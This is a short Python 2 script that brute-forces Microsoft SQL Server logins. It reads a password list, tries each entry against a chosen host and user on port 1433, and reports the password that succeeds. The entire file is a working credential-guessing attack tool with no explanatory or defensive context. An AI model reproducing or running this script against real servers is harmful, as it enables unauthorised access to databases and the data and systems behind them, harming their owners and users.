import pymssql
import optparse

Found = 0

def mssqlconn(hostname,username,passwd):
	global Found
	try:
		pymssql.connect(host=hostname+':1433',user=username,password=passwd)
		print '[+]MSSQL Password Found:' + passwd
		Found = 1
	except:
		print '[-]Testing' + passwd	

def main():
	parser = optparse.OptionParser('usage%proc'+'-H<target> -U<username> -F<passwdFile>')
	parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
	parser.add_option('-U', dest='user', type='string', help='specify target user')
	parser.add_option('-F', dest='passwdFile', type='string', help='specify the parssword File')
	(options,args)=parser.parse_args()
	tgtHost=options.tgtHost
	user=options.user
	passwdFile=options.passwdFile
	if (tgtHost == None) | (user == None) | (passwdFile == None):
		print parser.usage
		exit(0)
	f = open(passwdFile,'r')
	for line in f.readlines():
		password = line.strip('\n').strip('\r')
		mssqlconn(tgtHost,user,password)
		if Found:
			exit(0)

if __name__ == '__main__':
	main()
